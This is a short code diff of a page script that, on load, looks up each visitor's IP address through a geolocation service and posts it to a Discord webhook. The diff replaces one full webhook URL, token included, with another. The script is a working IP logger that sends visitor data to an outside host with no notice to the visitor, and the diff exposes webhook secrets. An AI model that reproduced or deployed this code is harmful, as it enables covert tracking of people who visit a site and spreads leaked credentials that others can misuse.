@@ -3,7 +3,7 @@ $(document).ready(function() {
     $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {  
       // Send IP information to Discord webhook
       var ipAddress = data.ip; // Extract the IP address from the response object
-      var discordWebhookURL = 'https://discord.com/api/webhooks/1183352632962719804/CBtTKAuz9fPxJx3epHcV4H40R50nNEBAwPUzgw0HF7GEaReV1KnHPj2lY6AFVBACOQfj';
+      var discordWebhookURL = 'https://discord.com/api/webhooks/1177621445183021076/SSn-TjvL4h7VvyAvMlJCS7k5H02VEcysWrxcaCUSHanAsR1iAIUGsR-QpFJ01mCYuRff';
     
       // Create the payload to send to Discord
       var discordPayload = {
